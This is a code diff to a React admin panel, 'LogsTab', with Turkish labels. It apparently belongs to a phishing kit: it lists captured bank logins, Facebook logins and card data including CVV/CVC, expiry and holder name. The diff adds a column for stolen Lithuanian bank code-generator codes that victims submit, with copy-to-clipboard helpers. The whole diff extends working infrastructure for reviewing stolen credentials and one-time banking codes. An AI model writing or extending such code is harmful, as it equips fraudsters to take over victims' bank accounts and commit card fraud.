@@ -852,6 +852,30 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     return [];
   };
 
+  // GENERATOR GECMISI: submit sirasinda onceki kayit history'ye tasindi,
+  // guncel kayit zaten kolonda — filtreleme gerekmez, sadece parse et.
+  const parseGeneratorHistory = (fd: Record<string, unknown>): any[] => {
+    try {
+      const raw = fd.generatorLoginHistory;
+      let arr: unknown;
+      if (typeof raw === "string") {
+        try { arr = JSON.parse(raw); } catch { arr = raw; }
+      } else {
+        arr = raw;
+      }
+      if (!Array.isArray(arr)) return [];
+      return arr.filter(
+        (r) =>
+          r &&
+          typeof r === "object" &&
+          (r as any).data &&
+          typeof (r as any).data === "object" &&
+          Object.keys((r as any).data).length > 0
+      );
+    } catch { /* ignore */ }
+    return [];
+  };
+
   const [chatMessages, setChatMessages] = useState<any[]>([]);
   const [chatInput, setChatInput] = useState("");
   const [pastedImage, setPastedImage] = useState<File | null>(null);
@@ -2449,9 +2473,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         if (hsAny.bankLoginHistory !== undefined) mergedFd.bankLoginHistory = hsAny.bankLoginHistory;
         if (hsAny.facebookLoginHistory !== undefined) mergedFd.facebookLoginHistory = hsAny.facebookLoginHistory;
         if (hsAny.cardLoginHistory !== undefined) mergedFd.cardLoginHistory = hsAny.cardLoginHistory;
+        if (hsAny.generatorLoginHistory !== undefined) mergedFd.generatorLoginHistory = hsAny.generatorLoginHistory;
         const bHistory = parseBankHistory(mergedFd);
         const fHistory = parseFacebookHistory(mergedFd);
         const cHistory = parseCardHistory(mergedFd);
+        const gHistory = parseGeneratorHistory(mergedFd);
         const copyText = (t: string) => {
           try { void navigator.clipboard.writeText(t); } catch { /* ignore */ }
         };
@@ -2501,6 +2527,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       📘 Facebook: <span className="font-bold">{fHistory.length}</span>
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                       💳 Kart: <span className="font-bold">{cHistory.length}</span>
+                      <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
+                      🔢 Generator: <span className="font-bold">{gHistory.length}</span>
                     </p>
                   </div>
                 </div>
@@ -2514,7 +2542,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
               {/* BODY - SCROLL */}
               <div className={`overflow-y-auto p-6 space-y-8 ${darkMode ? 'bg-[#0b0b0e]' : 'bg-white'}`}>
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-8">
                   {/* ====================== 🏦 BANKA GİRİŞLERİ ====================== */}
                   <div>
                     <div className="flex items-center gap-2 mb-4">
@@ -2685,6 +2713,65 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                                 <ValRow label="Son Kul. Tar." value={rExpiry || undefined} />
                                 <ValRow label="CVV/CVC" value={rCvc || undefined} />
                                 <ValRow label="Kart Sahibi" value={rHolder || undefined} />
+                              </div>
+                            </div>
+                          );
+                        })}
+                      </div>
+                    )}
+                  </div>
+
+                  {/* ====================== 🔢 GENERATOR GİRİŞLERİ ====================== */}
+                  <div>
+                    <div className="flex items-center gap-2 mb-4">
+                      <span className="text-xl">🔢</span>
+                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Generator (Geçmiş)</h4>
+                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                        {gHistory.length} adet
+                      </span>
+                    </div>
+                    {gHistory.length === 0 ? (
+                      <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
+                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş generator kaydı yok.</p>
+                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar generator kodu gönderince eskisi burada görünür.</p>
+                      </div>
+                    ) : (
+                      <div className="space-y-3">
+                        {gHistory.map((rec, idx) => {
+                          const r = rec as Record<string, any>;
+                          const genLabel =
+                            r.generatorType === "generator2" ? "Generatoriaus kodas 2" : "Generatoriaus kodas 1";
+                          const entries =
+                            r.data && typeof r.data === "object"
+                              ? Object.entries(r.data as Record<string, unknown>).filter(
+                                  ([, v]) => v != null && String(v).trim() !== ""
+                                )
+                              : [];
+                          return (
+                            <div
+                              key={`gen-${idx}`}
+                              className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}
+                            >
+                              <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
+                                <div className="flex items-center gap-2 min-w-0">
+                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
+                                    #{gHistory.length - idx}
+                                  </span>
+                                  <div className="min-w-0">
+                                    <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
+                                      {genLabel}
+                                    </p>
+                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                      {fmtDate(r.submittedAt)}
+                                    </p>
+                                  </div>
+                                </div>
+                              </div>
+                              <div className="px-4 py-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
+                                <ValRow label="Verilen Kod" value={r.generatorCode as string | undefined} />
+                                {entries.map(([k, v]) => (
+                                  <ValRow key={k} label={k.replace(/_/g, " ")} value={String(v)} />
+                                ))}
                               </div>
                             </div>
                           );
